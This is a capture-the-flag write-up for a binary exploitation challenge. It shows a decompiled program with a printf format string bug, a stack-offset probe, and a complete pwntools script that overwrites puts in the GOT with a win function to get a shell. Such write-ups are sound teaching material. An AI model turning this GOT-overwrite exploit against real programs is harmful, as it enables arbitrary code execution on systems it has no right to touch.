# [Pwn] GOT DAMN!!!!!!!!

## 💡 Challenge Description

![img](got_damn!!!!!!!!.png)

## 🔒 ELF Properties

```
┌──(rydzze㉿rydzze)-[/[Pwn] GOT DAMN!!!!!!!!]
└─$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=231d3ba756613f9d9e6f8e39ecb59cd36c53cc5d, for GNU/Linux 3.2.0, not stripped

┌──(rydzze㉿rydzze)-[/[Pwn] GOT DAMN!!!!!!!!]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   43 Symbols        No    0               2               chall
```

## ✨ Walkthrough

Format string vulnerability.

```c
// using Ghidra

undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined name [32];
  char msg [328];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  initialize();
  puts("Welcome to this GOTDamn \'leave a message\' system");
  
  printf("Enter your name: ");
  read(0,name,0x18);
  printf("Enter your message: ");
  read(0,msg,0x140);
  
  puts("Thank you");
  printf("Mr/Ms %s",name);  // not vuln
  printf(msg);              // vuln !!!
  puts("Your message will be pass to the administrator");

  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}

void win(void)
{
  system("/bin/sh");
  return;
}
```

```
┌──(rydzze㉿rydzze)-[/[Pwn] GOT DAMN!!!!!!!!]
└─$ ./chall
Welcome to this GOTDamn 'leave a message' system
Enter your name: rydzze
Enter your message: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p
Thank you
Mr/Ms rydzze
AAAAAAAA 0x7fff7283be80 (nil) (nil) 0x73 0xffffffff 0xa61 (nil) (nil) 0xf0b5ff 0x4141414141414141 0x2520702520702520
Your message will be pass to the administrator
```

We could see our input AAAAAAAA in the stack with the value of 0x4141414141414141 at the offset of 10. That said, for payload we could use puts from GOT and inject the win address to trigger the win function.

## ⚙ Full Script

```py
from pwn import *
elf = context.binary = ELF('./chall')

p = process('./chall')
# p = remote("IP_ADDR", PORT)

WIN_ADDR = elf.sym['win']
puts_got = elf.got['puts']

log.success(f"WIN_ADDR: {hex(WIN_ADDR)}")
log.success(f"puts@GOT: {hex(puts_got)}")

payload = fmtstr_payload(10, {puts_got: WIN_ADDR})
p.sendlineafter(b"Enter your name: ", b"rydzze")
p.sendlineafter(b"Enter your message: ", payload)
p.recvuntil(b"@@")

p.interactive()
```

## 🛠 Exploit

```
┌──(rydzze㉿rydzze)-[/[Pwn] GOT DAMN!!!!!!!!]
└─$ python solve.py
[*] '/[Pwn] GOT DAMN!!!!!!!!/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './chall': pid 1380
[+] WIN_ADDR: 0x40121d
[+] puts@GOT: 0x404018
[*] Switching to interactive mode
$ whoami
rydzze
```